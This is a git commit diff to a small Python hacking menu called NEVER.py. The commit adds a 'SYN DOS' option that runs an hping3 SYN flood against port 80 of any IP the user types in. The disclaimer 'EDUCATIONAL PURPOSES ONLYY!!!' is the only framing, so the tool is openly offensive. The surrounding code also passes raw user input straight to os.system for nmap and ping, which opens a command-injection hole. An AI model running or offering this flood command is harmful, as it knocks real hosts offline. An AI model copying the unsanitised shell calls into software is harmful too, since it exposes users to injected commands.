3b602e5c6bca9fc91e2e6f2851f5919ccc5fd03e
j4mzqkq844-beep <ayan.cristian.clivet@icloud.com>
2026-07-20 17:28:34 -0400

    Add SYN DOS option to NEVER.py

--- NEVER.py
+++ NEVER.py
@@ -5,7 +5,8 @@ print(text)
 print("EDUCATIONAL PURPOSES ONLYY!!!")
 option = input("""1.NMAP PORT SCAN
          2.PINGER
-         3. Close NEVER """)
+         3.SYN DOS
+         4. CLOSE NEVER""")
 if option == "1":
     target_ip = input("What is the target's ip ")
     os.system("nmap " + target_ip)
@@ -13,4 +14,7 @@ elif option == "2":
     target_ip = input("What is the ip of the system you Wanna ping? ")
     os.system("ping " + target_ip)
 elif option == "3":
+    target_ip = input("What is the ip of the target? ")
+    os.system("sudo hping3 -S --flood -p 80 " + target_ip)
+elif option == "4":
     exit()
